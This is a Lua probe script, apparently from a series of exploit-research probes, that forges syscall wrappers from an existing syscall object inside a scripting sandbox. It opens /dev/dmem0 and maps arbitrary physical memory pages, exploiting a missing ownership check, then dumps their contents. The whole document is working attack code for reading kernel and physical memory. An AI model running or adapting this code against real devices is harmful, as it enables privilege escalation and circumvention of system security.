-- CRASH_CLASS: HIGH
-- PROBE 806b: read physical pages through /dev/dmem0 -- ownership is not checked
--
-- 806a showed mmap(va,0x4000,0x33,MAP_SHARED|MAP_FIXED,fd,phys) returns the requested address
-- for phys 0, 0x100000, 0x100000000 and 0x110000000, and returns -1 only for phys values that are
-- not 0x4000-aligned (0x1000, 0x100001000).  That is an alignment check, not an ownership check.
-- This probe maps each candidate and prints the first 32 bytes at that physical address.
print("=== PROBE 806b: PHYSICAL READ VIA /dev/dmem0 ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_open = make_syscall(5)
pcall(function() return getpid() end)
local s = "/dev/dmem0"
local cpath = memory.alloc(32)
for i = 1, #s do pcall(function() memory.write_byte(cpath + i - 1, s:byte(i)) end) end
pcall(function() memory.write_byte(cpath + #s, 0) end)
local fd = to_num(select(2, pcall(function() return sc_open(uint64(cpath), uint64(2), uint64(0)) end)))
print("[0] /dev/dmem0 fd=" .. fd)
local VA = 0x880000000
local function probe(label, phys)
    pcall(function() return sc_munmap(uint64(VA), uint64(0x4000)) end)
    local ok, r = pcall(function()
        return sc_mmap(uint64(VA), uint64(0x4000), uint64(0x33), uint64(0x11),
            uint64(fd), u64(math.floor(phys / 4294967296), phys % 4294967296))
    end)
    if not ok then print(string.format("  %-14s pcall-fail", label)) return end
    local rv = to_num(r)
    if rv ~= VA then
        print(string.format("  %-14s mmap=%s", label, tostring(r)))
        return
    end
    local w = {}
    for i = 0, 7 do
        local v = rd(VA + i * 4)
        if v == nil then w[#w + 1] = "????" else w[#w + 1] = string.format("%08X", v) end
    end
    print(string.format("  %-14s %s | %s", label, table.concat(w, " ", 1, 4), table.concat(w, " ", 5, 8)))
end
print("")
print("[1] aligned physical pages")
probe("0x0", 0)
probe("0x4000", 0x4000)
probe("0x100000", 0x100000)
probe("0x1000000", 0x1000000)
probe("0x4000000", 0x4000000)
probe("0x10000000", 0x10000000)
probe("0x40000000", 0x40000000)
probe("0x100000000", 0x100000000)
probe("0x110000000", 0x110000000)
probe("0x120000000", 0x120000000)
probe("0x140000000", 0x140000000)
print("")
print("[2] alive pid=" .. to_num(getpid()))
